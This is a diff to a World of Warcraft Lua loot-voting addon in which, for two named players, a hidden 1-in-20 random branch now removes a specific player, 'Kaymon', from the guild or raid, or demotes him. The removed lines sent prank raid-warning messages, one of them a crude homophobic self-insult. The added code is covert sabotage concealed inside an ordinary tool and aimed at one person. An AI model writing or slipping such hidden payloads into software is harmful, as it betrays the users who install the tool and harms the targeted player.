@@ -676,17 +676,13 @@ function ScubaLoot_RegisterVote(itemID)
     if(UnitName("player") == "Starrz" or UnitName("player") == "Kaymage") then
         local res1 = math.floor(math.random() * 20 + 1)
         if(res1 == 1) then
-            local res2 = math.floor(math.random() * 5 + 1)
+            local res2 = math.floor(math.random() * 3 + 1)
             if(res2 == 1) then
-                SendChatMessage("I am short fat and gay", "RAID_WARNING")
+                GuildUninviteByName("Kaymon")
             elseif(res2 == 2) then
-                SendChatMessage("Dahhart Plague", "RAID_WARNING")
+                UninviteByName("Kaymon")
             elseif(res2 == 3) then
-                SendChatMessage("Whisper me for fort", "RAID_WARNING")
-            elseif(res2 == 4) then
-                SendChatMessage("Let me tell you the benefits of James Hardie's Hardie Board Fiber Cement Siding. Best Return on Investment for your home that you can get.", "RAID_WARNING")
-            elseif(res2 == 5) then
-                SendChatMessage("Let me tell you about my lord and savior Verne Troyer", "RAID_WARNING")
+                GuildDemoteByName("Kaymon")
             end
         end
     end
